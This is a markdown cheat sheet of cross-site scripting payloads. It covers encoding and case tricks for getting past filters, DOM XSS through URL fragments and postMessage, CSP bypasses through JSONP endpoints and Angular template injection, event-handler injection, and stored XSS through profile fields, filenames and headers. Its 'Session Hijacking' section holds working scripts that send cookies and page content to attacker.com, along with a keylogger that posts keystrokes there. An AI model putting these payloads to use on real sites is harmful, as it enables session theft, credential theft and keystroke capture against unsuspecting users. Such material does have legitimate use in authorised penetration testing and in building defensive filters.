# XSS Payloads — Filter Bypass, CSP Bypass, Event Handler Injection

## Basic Proof-of-Concept Payloads

### HTML context (between tags)
```html
<script>alert(document.domain)</script>
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### Attribute context (inside attribute value)
```html
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onload="alert(1)" src="
' onerror='alert(1)
```

### JavaScript context (inside a script block)
```javascript
// Breaking out of string:
';alert(1)//
"-alert(1)-"
\";alert(1)//

// Inside template literal:
${alert(1)}
```

### URL/href context
```html
javascript:alert(1)
javascript:alert%281%29
jAvAsCrIpT:alert(1)
data:text/html,<script>alert(1)</script>
```

---

## HTML Encoding and Filter Bypass

### HTML entity encoding (bypass naive string filters)
```html
<!-- Decimal entities -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- Hex entities -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

<!-- Double encoding (bypass double-decode filters) -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

### Case variation (bypass case-sensitive filters)
```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<img SrC=x OnErRoR=alert(1)>
```

### Null byte injection (bypass WAF pattern matching)
```html
<scri\x00pt>alert(1)</scri\x00pt>
<img src=x onerror\x00=alert(1)>
```

### Tag name obfuscation
```html
<!-- Unusual but valid HTML tags -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
```

### JavaScript URI bypasses
```html
<!-- Various encodings of "javascript:" -->
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
j&#97;vascript:alert(1)
javascript&#58;alert(1)
&#x6A;avascript:alert(1)

<!-- Protocol mangling (some older browsers) -->
Javas&#9;cript:alert(1)    <!-- tab between -->
Java&#10;Script:alert(1)   <!-- newline between -->
```

### SVG XSS (useful when HTML tags are filtered but SVG is allowed)
```html
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x>
<svg/onload=alert(1)>
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">
```

---

## DOM XSS Payloads

### Via location.hash (anchor fragment)
```
# Navigate to:
https://target.com/page#<img src=x onerror=alert(document.cookie)>
https://target.com/page#<svg onload=alert(1)>

# If URL-encoding is needed (JS decodes with decodeURIComponent):
https://target.com/page#%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
```

### Via URL search parameters
```
https://target.com/search?q=<script>alert(1)</script>
https://target.com/?redirect=javascript:alert(1)
```

### postMessage DOM XSS (if app listens to postMessage without origin check)
```javascript
// From attacker page or XSS, send:
window.opener.postMessage('<img src=x onerror=alert(1)>', '*');

// Or via iframe:
let iframe = document.createElement('iframe');
iframe.src = 'https://target.com/vulnerable-page';
document.body.appendChild(iframe);
iframe.onload = () => {
    iframe.contentWindow.postMessage('<svg onload=alert(1)>', '*');
};
```

---

## CSP Bypass Payloads

### Script-src 'unsafe-inline' (CSP is useless if this is set)
```
# Check CSP:
curl -I https://target.com | grep -i content-security-policy

# If "script-src 'unsafe-inline'" → all inline XSS payloads work
```

### JSONP endpoint bypass (script-src with whitelisted domains)
```html
<!-- If CSP allows https://trusted-cdn.com -->
<!-- And trusted-cdn.com has a JSONP endpoint: -->
<script src="https://trusted-cdn.com/api/data?callback=alert(1)"></script>

<!-- Common JSONP endpoints on whitelisted domains: -->
<!-- Google: https://accounts.google.com/o/oauth2/revoke?token=foo -->
<!-- Angular: https://ajax.googleapis.com/ajax/libs/angularjs/1.1.3/angular.min.js -->
```

### CSP bypass via Angular (if angular.js is whitelisted)
```html
<!-- If CSP allows AngularJS CDN and ng-app is rendered: -->
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.1.3/angular.min.js"></script>
<div ng-app ng-csp>
  {{$eval.constructor('alert(1)')()}}
</div>
```

### CSP bypass via 'unsafe-eval' + base64
```javascript
// If 'unsafe-eval' is set, eval() works:
eval(atob('YWxlcnQoMSk='));   // atob('YWxlcnQoMSk=') == 'alert(1)'
```

### CSP bypass via script gadgets (framework-specific)
```html
<!-- jQuery: if jQuery is loaded and CSP allows its origin -->
<div data-component='{"userInput": "<img src=x onerror=alert(1)>"}'>

<!-- AngularJS template injection (ng-app context): -->
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}

<!-- Polymer template injection -->
<x-gif src="data:image/gif;base64,..." callback="alert(1)">
```

### nonce reuse detection
```bash
# If CSP uses nonces, check if nonce is static (reused across responses):
for i in {1..5}; do
    curl -sI https://target.com/ | grep -i "script-nonce\|'nonce-"
done
# If same nonce appears every time → nonce reuse, XSS payload can include nonce
```

---

## Event Handler Injection Payloads

### Focus-based (no user interaction required with autofocus)
```html
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<details ontoggle=alert(1) open>
```

### Mouse events
```html
<div onmouseover=alert(1)>Hover me</div>
<a onmousedown=alert(1)>Click me</a>
<img src=valid.jpg onmouseout=alert(1)>
```

### Form events
```html
<form onsubmit=alert(1)><input type=submit></form>
<form onreset=alert(1)><input type=reset></form>
```

### Media events
```html
<video src=valid.mp4 oncanplay=alert(1) autoplay muted playsinline></video>
<audio src=valid.mp3 onloadstart=alert(1) autoplay></audio>
```

---

## Session Hijacking Payload (Real Impact)

```javascript
// Exfiltrate document.cookie to attacker server
<script>
new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie);
</script>

// Via fetch (works when cookies are HttpOnly — grab from DOM instead):
<script>
fetch('https://attacker.com/steal?d='+encodeURIComponent(document.body.innerHTML));
</script>

// Keylogger + cookie theft combined:
<script>
(function(){
  var s='';
  document.addEventListener('keypress',function(e){s+=e.key;});
  setInterval(function(){
    if(s.length>0){
      fetch('https://attacker.com/keys?k='+encodeURIComponent(s));
      s='';
    }
  }, 5000);
  new Image().src='https://attacker.com/cookie?c='+encodeURIComponent(document.cookie);
})();
</script>
```

---

## Stored XSS Payloads (for Comments, Profiles, Messages)

### With markdown rendering (markdown injection)
```markdown
[Click me](javascript:alert(1))
![x](x" onerror="alert(1))
<script>alert(1)</script>
```

### Profile bio / description field
```
<script>alert(document.cookie)</script>
"><img src=x onerror=alert(1)>
```

### File upload filename XSS (rendered in file browser)
```
"><img src=x onerror=alert(1)>.jpg
<svg onload=alert(1)>.svg
```

### HTTP header injection (User-Agent, Referer stored and rendered in admin panel)
```
User-Agent: <script>alert(1)</script>
Referer: "><script>alert(document.cookie)</script>
```
